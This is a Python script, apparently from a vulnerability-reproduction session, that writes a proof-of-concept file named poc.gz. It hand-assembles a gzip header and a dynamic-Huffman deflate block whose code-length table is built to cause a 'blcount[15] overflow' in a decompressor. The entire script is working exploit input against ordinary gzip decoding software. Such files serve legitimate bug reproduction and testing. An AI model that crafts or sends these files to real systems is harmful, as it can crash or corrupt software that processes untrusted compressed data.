import struct

bits = []

def add_bits(value, n):
    for i in range(n):
        bits.append((value >> i) & 1)

# Gzip header
data = bytearray()
data += b'\x1f\x8b\x08\x00'  # ID1, ID2, CM=8, FLG=0
data += b'\x00\x00\x00\x00'  # MTIME
data += b'\x00\x03'          # XFL, OS

# Deflate stream
# BFINAL=1, BTYPE=10 (dynamic Huffman)
add_bits(1, 1)  # BFINAL
add_bits(2, 2)  # BTYPE = 10 (binary 10, LSB first: bit1=0, bit2=1)

# HLIT = 257 -> field = 0 (5 bits)
add_bits(0, 5)
# HDIST = 1 -> field = 0 (5 bits)
add_bits(0, 5)
# HCLEN = 19 -> field = 15 (4 bits)
add_bits(15, 4)

# Code length code lengths, in order huff_cl_cl = [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]
# clenc[15]=1, clenc[1]=2, clenc[0]=2, rest 0
cl_order = [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]
clenc = {15:1, 1:2, 0:2}
for sym in cl_order:
    add_bits(clenc.get(sym, 0), 3)

# Code length tree canonical codes:
#   symbol 15: length 1, code 0
#   symbol 1:  length 2, code 10 (binary)
#   symbol 0:  length 2, code 11 (binary)

def encode_cl(sym):
    if sym == 15:
        add_bits(0, 1)
    elif sym == 1:
        add_bits(0b10, 2)
    elif sym == 0:
        add_bits(0b11, 2)
    else:
        raise ValueError(f"unexpected sym {sym}")

# bitlen[0] = 15  -> triggers blcount[15] overflow
encode_cl(15)
# bitlen[1..255] = 0
for _ in range(255):
    encode_cl(0)
# bitlen[256] = 1 (end of block)
encode_cl(1)
# bitlenD[0] = 1 (distance code)
encode_cl(1)

# Now the deflate data: just end of block (symbol 256)
# Deflate code tree: symbol 256 has length 1, code 0
add_bits(0, 1)

# Pad to byte boundary
while len(bits) % 8:
    bits.append(0)

# Convert bits to bytes
for i in range(0, len(bits), 8):
    byte = 0
    for j in range(8):
        byte |= bits[i+j] << j
    data.append(byte)

# Gzip trailer: CRC32 and ISIZE (uncompressed data is empty)
import zlib
crc = zlib.crc32(b'') & 0xffffffff
data += struct.pack('<I', crc)
data += struct.pack('<I', 0)  # ISIZE

with open('/workspace/poc.gz', 'wb') as f:
    f.write(data)
print(f"Wrote {len(data)} bytes to /workspace/poc.gz")
EOF
